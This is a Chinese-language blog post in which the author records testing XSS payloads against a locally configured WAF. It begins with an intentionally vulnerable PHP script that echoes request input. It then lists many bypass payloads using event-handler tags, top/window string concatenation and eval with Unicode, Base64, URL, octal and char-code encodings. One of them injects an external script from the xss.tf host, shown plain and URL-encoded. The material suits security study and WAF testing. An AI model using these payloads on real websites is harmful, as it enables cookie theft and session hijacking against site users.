  最近在学习xss方面的知识，涉及到waf的测试，在这里做个记录，方面查阅。

  ## 0x00 搭建环境
  - - -
  本地搭建测试waf测试，xss相关防护规则全部开启。
  
 ![1](https://ws1.sinaimg.cn/large/005DAKuvgy1g1sv90art7j30l10c0myc.jpg)
 
  ## 0x01 Self-Xss绕过
  - - -

  测试脚本
  ```php
  <?php   
    $input = @$_REQUEST["xss"];
    echo "<div>".$input."</div>"
  ?>
  ```
  
  首先思路就是一些被waf**遗漏的标签**，暂时不考虑**编码**或者**拼接字符串**这类思路，我们直接拿来测试。   

  `<video src=1 onerror=alert(/xss/)>`绕过。
  
  ![2](https://ws1.sinaimg.cn/large/005DAKuvgy1g1tv4ytym1j30uj08lq3m.jpg)
  
  类似的标签还有`<audio src=x onerror=alert(/xss/)>`
  
  ![3](https://ws1.sinaimg.cn/large/005DAKuvgy1g1tv87ifeuj30uj0933z8.jpg)
  
  除此之外以下几个`payload`都可以绕过。
  ```javascript
  <body/onfocus=alert(/xss/)>
  <details open ontoggle=alert(/xss/)>
  <button onfocus=alert(/xss/) autofocus>
  
  ```
  利用**伪协议**
  
  waf拦截
  
  ![4](https://ws1.sinaimg.cn/large/005DAKuvgy1g1tvkcpm4uj30uj08174y.jpg)
  
  加上一个**xmlns属性**即可绕过
  
  ![5](https://ws1.sinaimg.cn/large/005DAKuvgy1g1tvojz1hmj30uj08kdgj.jpg)
  
  实际上，我测试的waf是免费使用的，所以有些厂商可以象征性的取一些样本，拦截一下常见的标签，如果你购买了厂商的高级服务，那我们绕过就有难度，然而大多数网站还是使用免费版的多。
  
  ## 拼接字符类
  - - -
  拼接字符串的话，一般把关键字拆分成几个字符串，再拼接执行，结合**top**,**concat**之类的。
  
  ### top对象
  - - -
  
  top输出字符
  
  ![6](https://ws1.sinaimg.cn/large/005DAKuvgy1g1uep4k2whj30ao097dfs.jpg)
  
  或者打印cookie
  
  ![7](https://ws1.sinaimg.cn/large/005DAKuvgy1g1ueqqxro8j30f0091aa3.jpg)
  
  top可以连接`对象`以及`属性`或`函数`，那么我们可以做到很多，例如:
  
  直接top连接一个alert函数
  
  ![8](https://ws1.sinaimg.cn/large/005DAKuvgy1g1uewncru3j30x60duwem.jpg)
  
  `<details open ontoggle=top.alert(1)>`也可以绕过waf
  
  ![9](https://ws1.sinaimg.cn/large/005DAKuvgy1g1ueypy79kj30uj093t9h.jpg)
  
  `top['alert'](1)`也可弹窗，但waf拦截
  
  ![10](https://ws1.sinaimg.cn/large/005DAKuvgy1g1ufadg61cj30uj06vt95.jpg)
  
  绕过的话，很简单用`prompt`方法或者`confirm`都可以
  
  `<details open ontoggle=top['prompt'](1)>`
  
  ![11](https://ws1.sinaimg.cn/large/005DAKuvgy1g1ufd5cic3j30uj08yaau.jpg)
  
  如果我说一定要用`alert`的话就要用到`接字符串`了。
  
  `<details open ontoggle=top['al'%2b'ert'](1)>` %2b为url编码的+
  
  ![12](https://ws1.sinaimg.cn/large/005DAKuvgy1g1ufh1i5dkj30uj08jt9g.jpg)
  
  eval函数执行
  
  `<details open ontoggle=top.eval('ale'%2B'rt(1)') >`
  
  ![13](https://ws1.sinaimg.cn/large/005DAKuvgy1g1ug4njpphj30uj090aau.jpg)
  
  eval直接用也可以弹
  
  `<details open ontoggle=eval('alert(1)') >`
  
  ![14](https://ws1.sinaimg.cn/large/005DAKuvgy1g1ug8l4j2ej30uj08vjs5.jpg)

  这里为什么说到eval呢？因为如果eavl不拦截的话，我们可以测试各种编码，当然这是在牺牲长度的前提下。
  
  例如： `Unicode编码`
  
  `<details open ontoggle=eval('\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029') >`
  
  ![15](https://ws1.sinaimg.cn/large/005DAKuvgy1g1ugbw6c1gj30uj08ujs6.jpg)
  
  其他：
  ```html
  Base64编码：
  <details open ontoggle=eval(atob('YWxlcnQoMSk=')) >
  eval拦截的话，可以试试，把 e Unicode编码
  <details open ontoggle=\u0065val(atob('YWxlcnQoMSk=')) >
  url编码：  
  <details open ontoggle=%65%76%61%6c(atob('YWxlcnQoMSk=')) >
  url编码： 
  <details open ontoggle=eval('%61%6c%65%72%74%28%31%29') >
  JS8编码：
  <details open ontoggle=eval('\141\154\145\162\164\50\61\51') >
  Ascii码绕过：
  <details open ontoggle=eval(String.fromCharCode(97,108,101,114,116,40,49,41)) >
  其他自测
  
  ```
  引用外部url，运用基于DOM的方法创建和插入节点把外部JS文件注入到网页。
  ```html
  <details open ontoggle=eval("appendChild(createElement('script')).src='http://xss.tf/eeW'") >
  ```
 ![16](https://ws1.sinaimg.cn/large/005DAKuvgy1g1uh5hp1a8j30uj0b1jsy.jpg)
  
  url编码
  ```html
  <details open ontoggle=eval(%61%70%70%65%6e%64%43%68%69%6c%64%28%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%73%63%72%69%70%74%27%29%29%2e%73%72%63%3d%27%68%74%74%70%3a%2f%2f%78%73%73%2e%74%66%2f%65%65%57%27) >
  ```
  ![17](https://ws1.sinaimg.cn/large/005DAKuvgy1g1uhaxb0t2j30uj09uwg1.jpg)
  
  ### window对象
  - - -
  
  window和top类似，比如：
  `<img src=x onerror=window.alert(1) >`
  
  拼接一样的
  `<img src=x onerror=window['al'%2B'ert'](1) >`
  
  其他操作，参照上一章。
  
  
  通过赋值，也是我们常见的，看个例子：
  ```
  <img src=x onerror=_=alert,_(/xss/) >
  <img src=x onerror=_=alert;_(/xss/) >
  <img src=x onerror=_=alert;x=1;_(/xss/) >
  ```
  ![18](https://ws1.sinaimg.cn/large/005DAKuvgy1g1v3d5hdwmj30uj09m3za.jpg)
  
  短一点的`<body/onfocus=_=alert,_(123)>`
  
  ![18](https://ws1.sinaimg.cn/large/005DAKuvgy1g1v3l03yfxj30uj097mxw.jpg)
  
  函数赋值，也比较常见
  ```
  <body/onfocus="a=alert,a`/xss/`">
  
  ```
  
  
